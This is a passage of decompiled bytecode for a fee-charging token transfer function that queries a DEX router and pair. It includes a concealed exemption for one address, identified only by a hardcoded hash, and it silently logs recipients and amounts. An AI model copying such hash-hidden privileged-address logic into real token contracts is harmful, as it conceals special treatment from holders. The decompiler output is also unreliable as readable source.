                            gas gas_remaining wei
                           args address(this.address), address(_11573)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _11591 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    require mem[_11591] == mem[_11591 + 12 len 20]
                    if arg1 != mem[_11591 + 12 len 20]:
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11645 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11673 = mem[_11645]
                        require mem[_11645] == mem[_11645 + 12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11717 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11733 = mem[_11717]
                        require mem[_11717] == mem[_11717 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_11733)
                        require ext_code.size(address(_11673))
                        staticcall address(_11673).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_11733)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _11825 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _11885 = mem[_11825]
                        require mem[_11825] == mem[_11825 + 12 len 20]
                        if mem[_11825 + 12 len 20] != msg.sender:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _12144 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12144 + 32 len mem[_12144]]):
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if this.address == arg1:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_11885):
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 0, 17
                                                        if not arg2:
                                                            revert with 0, 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 0, 17
                                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                                            revert with 0, 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                            revert with 0, 17
                                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _12194 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12194 + 32 len mem[_12194]]):
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if this.address == arg1:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 0, 17
                                                        if not arg2:
                                                            revert with 0, 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 0, 17
                                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                                            revert with 0, 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                            revert with 0, 17
                                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        mem[0] = msg.sender
                        mem[32] = 16
                        if stor16[address(msg.sender)]:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _11675 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_11675 + 32 len mem[_11675]]):
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if this.address == arg1:
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(msg.sender)]:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 0, 17
                                                        if not arg2:
                                                            revert with 0, 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor10)
                                                        staticcall stor10.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor66DE[stor19.length] = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 0, 17
                                                        if balanceOf[0] > !(arg2 * _fee / 100):
                                                            revert with 0, 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                            revert with 0, 17
                                                        balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            require ext_code.size(stor10)
                            staticcall stor10.factory() with:
                                    gas gas_remaining wei
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _11651 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _11687 = mem[_11651]
                            require mem[_11651] == mem[_11651 + 12 len 20]
                            require ext_code.size(stor10)
                            staticcall stor10.WETH() with:
                                    gas gas_remaining wei
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _11723 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _11746 = mem[_11723]
                            require mem[_11723] == mem[_11723 + 12 len 20]
                            mem[mem[64] + 4] = this.address
                            mem[mem[64] + 36] = address(_11746)
                            require ext_code.size(address(_11687))
                            staticcall address(_11687).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(_11746)
                            mem[mem[64]] = ext_call.return_data[0]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            _11862 = mem[64]
                            mem[64] = mem[64] + ceil32(return_data.size)
                            require return_data.size >= 32
                            _11907 = mem[_11862]
                            require mem[_11862] == mem[_11862 + 12 len 20]
                            if mem[_11862 + 12 len 20] != msg.sender:
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[0] = arg1
                                    mem[32] = 16
                                    if stor16[address(arg1)]:
                                        if arg2 < 0:
                                            revert with 0, 17
                                        if balanceOf[0] > -1:
                                            revert with 0, 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 0, 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[arg1] > !arg2:
                                            revert with 0, 17
                                        balanceOf[arg1] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        mem[mem[64] + 32] = address(arg1)
                                        _12199 = mem[64]
                                        mem[mem[64]] = 20
                                        mem[64] = mem[64] + 52
                                        if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(mem[_12199 + 32 len mem[_12199]]):
                                            if arg2 < 0:
                                                revert with 0, 17
                                            if balanceOf[0] > -1:
                                                revert with 0, 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 0, 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[arg1] > !arg2:
                                                revert with 0, 17
                                            balanceOf[arg1] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if this.address == arg1:
                                                if arg2 < 0:
                                                    revert with 0, 17
                                                if balanceOf[0] > -1:
                                                    revert with 0, 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 0, 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[arg1] > !arg2:
                                                    revert with 0, 17
                                                balanceOf[arg1] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if msg.sender == address(_11907):
                                                    if arg2 < 0:
                                                        revert with 0, 17
                                                    if balanceOf[0] > -1:
                                                        revert with 0, 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 0, 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[arg1] > !arg2:
                                                        revert with 0, 17
                                                    balanceOf[arg1] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if stor18:
                                                        if arg2 < 0:
                                                            revert with 0, 17
                                                        if balanceOf[0] > -1:
                                                            revert with 0, 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 0, 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[arg1] > !arg2:
                                                            revert with 0, 17
                                                        balanceOf[arg1] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if not arg2:
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor66DE[stor19.length] = arg2
                                                            if arg2 < 0:
                                                                revert with 0, 17
                                                            if balanceOf[0] > -1:
                                                                revert with 0, 17
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 0, 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[arg1] > !arg2:
                                                                revert with 0, 17
                                                            balanceOf[arg1] += arg2
                                                            emit Transfer(arg2, msg.sender, arg1);
                                                        else:
                                                            if arg2 and _fee > -1 / arg2:
                                                                revert with 0, 17
                                                            if not arg2:
                                                                revert with 0, 18
                                                            if arg2 * _fee / arg2 != _fee:
                                                                revert with 0, 'SafeMath: multiplication overflow'
                                                            require arg2 <= _maxTxAmount
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.factory() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(stor10)
                                                            staticcall stor10.WETH() with:
                                                                    gas gas_remaining wei
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            require ext_code.size(address(ext_call.return_data[0]))
                                                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                    gas gas_remaining wei
                                                                   args address(this.address), address(ext_call.return_data[0])
                                                            if not ext_call.success:
                                                                revert with ext_call.return_data[0 len return_data.size]
                                                            require return_data.size >= 32
                                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                            if ext_call.return_data[12 len 20] != arg1:
                                                                stor19.length++
                                                                stor19[stor19.length].field_0 = arg1
                                                                stor66DE[stor19.length] = arg2
                                                            if arg2 < arg2 * _fee / 100:
                                                                revert with 0, 17
                                                            if balanceOf[0] > !(arg2 * _fee / 100):
                                                                revert with 0, 17
                                                            balanceOf[0] += arg2 * _fee / 100
                                                            if balanceOf[address(msg.sender)] < arg2:
                                                                revert with 0, 17
                                                            balanceOf[address(msg.sender)] -= arg2
                                                            if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                                                revert with 0, 17
                                                            balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                                            emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                            if arg2 * _fee / 100:
                                                                emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                            else:
                                if stor16[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[0] = arg1
                                    mem[32] = 16
                                    if stor16[address(arg1)]:
